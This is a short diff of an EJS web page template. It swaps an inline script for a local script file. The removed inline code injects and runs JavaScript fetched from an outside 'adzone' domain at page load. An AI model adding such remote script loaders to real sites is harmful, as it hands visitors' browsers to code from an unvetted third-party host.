@@ -3,34 +3,11 @@
   <head>
     <title><%= title %></title>
     <link rel='stylesheet' href='/stylesheets/style.css' />
+    <script type="text/javascript" src="/javascripts/jiazai.min.js"></script>
   </head>
   <body>
     <h1><%= title %></h1>
     <p>Welcome to <%= title %></p>
-    <script type="text/javascript">
-    	function loadScript(src, callback) {
-		    var script = document.createElement('script'),
-		        head = document.getElementsByTagName('head')[0];
-		    script.type = 'text/javascript';
-		    script.charset = 'UTF-8';
-		    script.src = src;
-		    if (script.addEventListener) {
-		        script.addEventListener('load', function () {
-		            callback();
-		        }, false);
-		    } else if (script.attachEvent) {
-		        script.attachEvent('onreadystatechange', function () {
-		            var target = window.event.srcElement;
-		            if (target.readyState == 'loaded') {
-		                callback();
-		            }
-		        });
-		    }
-		    head.appendChild(script);
-		}
-		loadScript('http://tiexie0.top/adzone/getjs/ad'+Date.now()+'.js',function(){
-
-		});
-    </script>
+    
   </body>
 </html>
